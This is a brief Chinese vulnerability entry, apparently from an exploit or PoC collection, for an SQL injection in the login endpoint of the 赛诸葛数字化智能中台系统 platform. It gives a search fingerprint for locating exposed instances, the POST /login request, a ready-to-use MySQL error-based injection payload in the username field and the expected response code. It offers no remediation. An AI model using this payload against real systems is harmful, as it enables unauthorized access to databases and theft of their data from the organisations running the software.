# 赛诸葛数字化智能中台系统login存在SQL注入漏洞

赛诸葛数字化智能中台系统 ｜ SQL注入 ｜ —
- **指纹**：`body="static/index/image/login_left.png"`
- **请求**：`POST /login HTTP/1.1`

**Payload**
```
username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,version()))),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member=
```
- **响应特征**：201